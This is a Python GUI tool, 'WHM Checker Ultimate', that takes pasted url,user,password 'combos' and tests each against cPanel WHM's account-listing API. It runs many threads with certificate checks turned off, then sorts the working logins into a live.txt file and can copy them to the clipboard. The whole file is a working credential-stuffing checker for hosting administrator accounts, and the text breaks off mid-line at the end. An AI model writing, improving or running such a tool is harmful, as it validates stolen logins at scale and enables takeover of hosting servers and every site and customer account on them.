import requests
import concurrent.futures
import threading
import tkinter as tk
from tkinter import messagebox, simpledialog, filedialog
from tkinter import ttk
import urllib3
import time
import json
import os

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LOCK = threading.Lock()
MAX_WORKERS = 20
MAX_RETRIES = 3
RETRY_DELAY = 2

# ----- WHM Check Function -----
def check_whm(line):
    parts = line.strip().split(",")
    if len(parts) != 3:
        return None
    url, user, password = parts

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            r = requests.get(
                f"{url}/json-api/listaccts",
                auth=(user, password),
                verify=False,
                timeout=10
            )
            if r.status_code == 200 and "acct" in r.text:
                return f"{url},{user},LIVE", "LIVE"
            else:
                return f"{url},{user},DEAD/EXPIRED", "DEAD"
        except Exception as e:
            if attempt < MAX_RETRIES:
                time.sleep(RETRY_DELAY)
            else:
                return f"{url},{user},ERROR ({str(e)})", "ERROR"

# ----- Run Check -----
def run_check(combo_text, progress_var, output_label, live_var, dead_var, error_var):
    lines = [line.strip() for line in combo_text.splitlines() if line.strip()]
    if not lines:
        messagebox.showerror("Error", "No combos provided!")
        return

    total_lines = len(lines)
    counters = {"LIVE": 0, "DEAD": 0, "ERROR": 0}
    completed = 0

    live_results.clear()
    dead_results.clear()
    error_results.clear()

    def process_line(line):
        nonlocal completed
        result = check_whm(line)
        if result:
            line_text, status = result
            with LOCK:
                if status == "LIVE":
                    live_results.append(line_text)
                    counters["LIVE"] += 1
                elif status == "DEAD":
                    dead_results.append(line_text)
                    counters["DEAD"] += 1
                else:
                    error_results.append(line_text)
                    counters["ERROR"] += 1
                completed += 1
                progress_var.set(completed / total_lines * 100)
                live_var.set(counters["LIVE"])
                dead_var.set(counters["DEAD"])
                error_var.set(counters["ERROR"])
                output_label.config(text=f"Processing: {line_text}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        executor.map(process_line, lines)

    # Save results
    with open("live.txt", "w") as f:
        f.write("\n".join(live_results))
    with open("dead.txt", "w") as f:
        f.write("\n".join(dead_results))
    with open("error.txt", "w") as f:
        f.write("\n".join(error_results))

    messagebox.showinfo("Finished",
                        f"LIVE: {counters['LIVE']}\n"
                        f"DEAD: {counters['DEAD']}\n"
                        f"ERROR: {counters['ERROR']}")
    output_label.config(text="Status: Finished!")
    progress_var.set(100)

# ----- Clipboard Functions -----
def copy_live():
    root.clipboard_clear()
    root.clipboard_append("\n".join(live_results))
    messagebox.showinfo("Copied", "LIVE results copied to clipboard!")

def copy_dead():
    root.clipboard_clear()
    root.clipboard_append("\n".join(dead_results))
    messagebox.showinfo("Copied", "DEAD results copied to clipboard!")

def copy_error():
    root.clipboard_clear()
    root.clipboard_append("\n".join(error_results))
    messagebox.showinfo("Copied", "ERROR results copied to clipboard!")

# ----- Session Management -----
sessions = {}  # store name: combo_text
SESSION_FILE = "sessions.json"

def save_session():
    name = simpledialog.askstring("Save Session", "Enter session name:")
    if name:
        sessions[name] = combo_text_area.get("1.0", tk.END)
        session_dropdown['values'] = list(sessions.keys())
        session_dropdown.set(name)
        save_sessions_to_file()
        messagebox.showinfo("Saved", f"Session '{name}' saved!")

def load_session(event=None):
    name = session_dropdown.get()
    if name in sessions:
        combo_text_area.delete("1.0", tk.END)
        combo_text_area.insert(tk.END, sessions[name])
        output_label.config(text=f"Loaded session: {name}")

def save_sessions_to_file():
    try:
        with open(SESSION_FILE, "w") as f:
            json.dump(sessions, f)
    except Exception as e:
        messagebox.showerror("Error", f"Cannot save sessions: {e}")

def load_sessions_from_file():
    global sessions
    if os.path.exists(SESSION_FILE):
        try:
            with open(SESSION_FILE, "r") as f:
                sessions = json.load(f)
        except:
            sessions = {}

def import_sessions():
    path = filedialog.askopenfilename(filetypes=[("JSON Files", "*.json")])
    if path:
        try:
            with open(path, "r") as f:
                imported = json.load(f)
                sessions.update(imported)
                session_dropdown['values'] = list(sessions.keys())
                messagebox.showinfo("Imported", f"Imported {len(imported)} sessions.")
        except Exception as e:
            messagebox.showerror("Error", f"Cannot import sessions: {e}")

def export_sessions():
    path = filedialog.asksaveasfilename(defaultextension=".json",
                                        filetypes=[("JSON Files", "*.json")])
    if path:
        try:
            with open(path, "w") as f:
                json.dump(sessions, f)
            messagebox.showinfo("Exported", f"Sessions exported to {path}")
        except Exception as e:
            messagebox.showerror("Error", f"Cannot export sessions: {e}")

# ----- GUI -----
root = tk.Tk()
root.title("WHM Checker Ultimate (Multi-Session + Import/Export)")
root.geometry("780x650")
root.configure(bg="#2e2e2e")

# Load previous sessions
load_sessions_from_file()

# Session dropdown
tk.Label(root, text="Select session:", bg="#2e2e2e", fg="white").pack(pady=5)
session_dropdown = ttk.Combobox(root, values=list(sessions.keys()), width=60)
session_dropdown.pack()
session_dropdown.bind("<<ComboboxSelected>>", load_session)

session_button_frame = tk.Frame(root, bg="#2e2e2e")
session_button_frame.pack(pady=5)
tk.Button(session_button_frame, text="Save Session", bg="#444444", fg="white", command=save_session).grid(row=0,column=0,padx=5)
tk.Button(session_button_frame, text="Import Sessions", bg="#444444", fg="white", command=import_sessions).grid(row=0,column=1,padx=5)
tk.Button(session_button_frame, text="Export Sessions", bg="#444444", fg="white", command=export_sessions).grid(row=0,column=2,padx=5)

# Text area for combos
tk.Label(root, text="Paste your combos below (url,user,password per line):",
         bg="#2e2e2e", fg="white").pack(pady=5)
combo_text_area = tk.Text(root, width=90, height=15, bg="#1e1e1e", fg="white", insertbackground="white")
combo_text_area.pack(pady=5)

# Status label
output_label = tk.Label(root, text="Status: Waiting...", fg="white", bg="#2e2e2e")
output_label.pack(pady=10)

# Progress bar
progress_var = tk.DoubleVar()
style = ttk.Style(root)
style.theme_use('default')
style.configure("TProgressbar", thickness=20, background="#00ff00", troughcolor="#555555")
progress_bar = ttk.Progressbar(root, maximum=100, variable=progress_var, length=700, style="TProgressbar")
progress_bar.pack(pady=10)

# Counters
counter_frame = tk.Frame(root, bg="#2e2e2e")
counter_frame.pack(pady=10)
live_var = tk.IntVar(value=0)
dead_var = tk.IntVar(value=0)
error_var = tk.IntVar(value=0)

tk.Label(counter_frame, text="LIVE:", bg="#2e2e2e", fg="green").grid(row=0, column=0, padx=5)
tk.Label(counter_frame, textvariable=live_var, bg="#2e2e2e", fg="green").grid(row=0, column=1, padx=5)
tk.Label(counter_frame, text="DEAD:", bg="#2e2e2e", fg="red").grid(row=0, column=2, padx=5)
tk.Label(counter_frame, textvariable=dead_var, bg="#2e2e2e", fg="red").grid(row=0, column=3, padx=5)
tk.Label(counter_frame, text="ERROR:", bg="#2e2e2e", fg="orange").grid(row=0, column=4, padx=5)
tk.Label(counter_frame, textvariable=error_var, bg="#2e2e2e", fg="orange").grid(row=0, column=5, padx=5)

# Start button
tk.Button(root, text="Start Checking", bg="#444444", fg="white",
          activebackground="#555555", activeforeground="white",
          command=lambda: threading.Thread(
              target=run_check,
              args=(combo_text_area.get("1.0", tk.END), progress_var, output_label, live_var, dead_var, error_var)
          ).start()
         ).pack(p